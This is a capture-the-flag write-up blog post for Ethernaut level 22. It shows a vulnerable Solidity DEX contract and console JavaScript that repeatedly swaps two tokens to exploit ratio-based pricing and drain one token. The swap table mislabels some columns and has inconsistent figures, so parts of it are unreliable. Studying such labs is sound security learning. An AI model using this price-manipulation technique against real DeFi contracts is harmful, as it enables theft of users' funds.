---
layout: post
title: Ethernaut - 22. Dex
date:  2022-08-30
tags: ethernaut solidity
---
## Difficulty: 🌕🌕🌑🌑🌑
> The goal of this level is for you to hack the basic [DEX](https://en.wikipedia.org/wiki/Decentralized_finance#Decentralized_exchanges) contract below and steal the funds by price manipulation. <br />
You will start with 10 tokens of `token1` and 10 of `token2`. The DEX contract starts with 100 of each token.<br />
You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.<br /><br />
### Quick note<br />
Normally, when you make a swap with an ERC20 token, you have to `approve` the contract to spend your tokens for you. To keep with the syntax of the game, we've just added the `approve` method to the contract itself. So feel free to use `contract.approve(contract.address, <uint amount>)` instead of calling the tokens directly, and it will automatically approve spending the two tokens by the desired amount. Feel free to ignore the `SwappableToken` contract otherwise.<br />
Things that might help:
- How is the price of the token calculated?
- How does the `swap` method work?
- How do you `approve` a transaction of an ERC20?

## Contract
``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

contract Dex is Ownable {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor() public {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

## Writeup
The vulnerable part of this level is method `getSwapPrice`, which doing a simple division without dealing with decimal point. It let hackers drain all token from the contract easily.

1. Get new instance.
2. Approve.
    ``` javascript

    await contract.approve(contract.address, 10000)
    await contract.approve('YOUR_ACCOUNT_ADDRESS', 10000)

    ```
3. Get token address.
    ``` javascript

    const t1 = await contract.token1()
    const t2 = await contract.token2()

    ```
4. Swap

    |   |  from  | to  | amount  | swapAmount | player token1 | player token2  | dex token1 | dex token2 | 
    |---|---|---|---|---|---|---|---|---|
    | 0  |   |  |   |   | 100  | 100 | 10 | 10 |
    | 1 | t1 | t2  | 10 | 10  | 0 |  20 | 110  | 90 |
    | 2 | t2 | t1  | 20 | 24  | 24 | 0 | 86  | 110  |
    | 3 | t1 | t2  | 24 | 30  | 0 | 30 | 110  | 80  |
    | 4 | t2 | t1  | 30  | 41  | 41 | 0 |  69 | 110 |
    | 5 | t1  |  t2 | 41  | 65  | 0  | 65  | 110  | 45  |
    | 6 |  t2 | t1  | 45  |  110 | 110  | 20  | 0 | 90  |
    
   ``` javascript

   await contract.swap(t1, t2, 10)

   await contract.swap(t2, t1, 20)

   await contract.swap(t1, t2, 24)

   await contract.swap(t2, t1, 30)

   await contract.swap(t1, t2, 41)

   await contract.getSwapPrice(t2, t1, 45).then(v=>v.toString())
   // 110 = contract's token1 balance!

   await contract.swap(t2, t1, 45)

   await contract.balanceOf(token1, contract.address).then(v=>v.toString())
   // 0 

   ```
5. Submit instance ξ( ✿＞◡❛)